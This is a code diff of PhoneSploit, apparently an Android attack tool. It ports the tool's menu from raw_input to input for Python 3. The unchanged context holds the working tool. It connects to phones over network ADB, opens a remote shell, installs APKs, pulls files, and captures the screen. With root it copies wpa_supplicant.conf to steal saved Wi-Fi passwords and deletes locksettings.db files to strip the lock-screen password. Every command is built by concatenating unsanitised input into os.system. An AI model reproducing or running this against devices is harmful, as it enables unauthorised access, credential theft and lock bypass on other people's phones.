@@ -495,7 +495,7 @@ def main_linux():
     os.system("adb devices -l")
     print (("\n[{0}+{1}] Enter a phones ip address.(Type 99 to exit)").format(Fore.RED, Fore.WHITE))
     try:
-        device_name = raw_input (arrow+" phonesploit"+Fore.RED + "(connect_phone) "+Fore.WHITE + "> ")
+        device_name = input (arrow+" phonesploit"+Fore.RED + "(connect_phone) "+Fore.WHITE + "> ")
     except KeyboardInterrupt:
         main()
     if device_name == '':
@@ -503,12 +503,12 @@ def main_linux():
     if device_name == '99':
         exit()
     os.system("adb connect "+device_name+":5555")
-    option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+    option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
     while(1):
         if option == '1':
             os.system("adb devices -l")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option  ==  '2':
             os.system("adb disconnect")
@@ -519,15 +519,15 @@ def main_linux():
 
         elif option  == '4':
             os.system("adb -s "+device_name+" shell")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '5':
             print (("     "+connect))
             print (("    [{0}+{1}]Enter the apk location.").format(Fore.RED, Fore.WHITE))
-            apk_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
+            apk_location = input("    "+arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
             os.system("adb -s  "+device_name+" install "+apk_location)
             print (Fore.GREEN  +  "Apk has been installed.")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option ==  '6':
             print (("     "+connect))
@@ -535,123 +535,123 @@ def main_linux():
             print (("     "+connect))
             os.system("adb -s "+device_name+" shell screenrecord /sdcard/demo.mp4")
             print (("    [{0}+{1}]Enter where you would like the video to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
-            place_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(screen_record) "+Fore.WHITE + "> ")
+            place_location = input("    "+arrow + "phonesploit"+Fore.RED + "(screen_record) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" pull /sdcard/demo.mp4 "+place_location)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option  == '7':
             os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
             print (("     "+connect))
             print (("    [{0}+{1}]Enter where you would like the screenshot to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
-            place_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(screenshot) "+Fore.WHITE + "> ")
+            place_location = input("    "+arrow + "phonesploit"+Fore.RED + "(screenshot) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '8':
             os.system("adb kill-server && adb start-server")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '9':
             print (("     "+connect))
             print (("    [{0}+{1}]Enter a file location on a device").format(Fore.RED, Fore.WHITE))
-            file_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
+            file_location = input("    "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
             print (("        "+connect))
             print (("       [{0}+{1}]Enter where you would like the file to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
-            place_location = raw_input("       "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
+            place_location = input("       "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '10':
             os.system("adb -s "+device_name+ " reboot ")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option ==  '11':
             print (("     "+connect))
             print (("    [{0}+{1}]Enter a package name.").format(Fore.RED, Fore.WHITE))
-            package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
+            package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" unistall "+package_name)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '12':
             os.system('adb -s '+device_name+" logcat ")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '13':
             os.system("adb  -s "+device_name+" dumpsys")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '14':
             os.system("adb -s " +device_name+ " shell pm list packages -f")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '15':
             print (("     "+connect))
             print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
-            package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(app_run) "+Fore.WHITE + "> ")
+            package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(app_run) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '16':
             print (("     "+connect))
             print (("    [{0}+{1}]Enter a port on the device.").format(Fore.RED, Fore.WHITE))
-            port_device = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
+            port_device = input("    "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
             print (("         "+connect))
             print (("        [{0}+{1}]Enter a port to forward it too.").format(Fore.RED, Fore.WHITE))
-            forward_port = raw_input("        "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
+            forward_port = input("        "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '17':
             try:
                 print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C").format(Fore.RED, Fore.WHITE))
                 print (("     "+connect))
                 print (("    [{0}+{1}]Enter where you want the file to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
-                location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")
+                location = input("    "+arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")
                 os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                 os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
-                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
             except KeyboardInterrupt:
-                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '18':
             os.system("adb -s " +device_name+ " shell ip address show wlan0")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '19':
             print (("     "+connect))
             print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
-            package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+            package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" shell pm path "+package_name)
             print (("         "+connect))
             print (("        [{0}+{1}]Enter The path.looks like this /data/app/com.snapchat.android-qWgDcBiCEvANq6op_NPqeA==/base.apk").format(Fore.RED, Fore.WHITE))
-            path = raw_input("        "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+            path = input("        "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
             print (("             "+connect))
             print (("            [{0}+{1}]Enter The location to store the apk: [Default: present working directory]")  .format(Fore.RED, Fore.WHITE))
-            location =   raw_input("            "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
+            location =   input("            "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
             os.system("adb -s " +device_name+" pull "+path+" "+location)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '20':
             os.system("adb -s " +device_name+ " shell dumpsys battery")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '21':
             os.system("adb -s " +device_name+ " shell netstat")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '22':
             print (("     "+connect))
             print (("    [{0}+{1}] To turn wifi back on you need the device to be pluged in.").format(Fore.RED, Fore.WHITE))
             print (("     "+connect))
-            on_off = raw_input(Fore.WHITE + "    ["+Fore.RED+"+"+Fore.WHITE+"]Would you like the wifi "+Fore.GREEN +"on"+Fore.WHITE +"/"+Fore.RED +"off "+Fore.WHITE)
+            on_off = input(Fore.WHITE + "    ["+Fore.RED+"+"+Fore.WHITE+"]Would you like the wifi "+Fore.GREEN +"on"+Fore.WHITE +"/"+Fore.RED +"off "+Fore.WHITE)
             if on_off == 'off':
                 command = " shell svc wifi disable"
             else:
                 command = " shell svc wifi enable"
 
             os.system("adb -s "+device_name+command)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '23':
             print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C THIS IS ALSO UNTESTED").format(Fore.RED, Fore.WHITE))
@@ -662,7 +662,7 @@ def main_linux():
             os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
             os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
             print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '24':
             print ('''
@@ -754,22 +754,22 @@ def main_linux():
     85 -->  "TAG_LAST_KEYCODE"
             ''')
             print (("[{0}+{1}]Enter a number.").format(Fore.RED, Fore.WHITE))
-            num = raw_input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
+            num = input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
             os.system("adb -s "+device_name+" shell input keyevent "+num)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '25':
             os.system("adb -s " +device_name+ " dumpsys activity")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '0':
             global page2
             if page2 == True:
                 clear(page_2)
-                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
             else:
                 clear(page_1)
-                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == 'p':
             os.system('clear')
@@ -777,7 +777,7 @@ def main_linux():
             banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
             print (Fore.RED + banner_title)
             print (page_2)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == 'b':
             os.system('clear')
@@ -785,14 +785,14 @@ def main_linux():
             banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
             print (Fore.RED + banner_title)
             print (page_1)
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
         elif option == '99':
             exit()
             break
         else:
             os.system("error: invalid menu option")
-            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
+            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
 
 #=============================
 
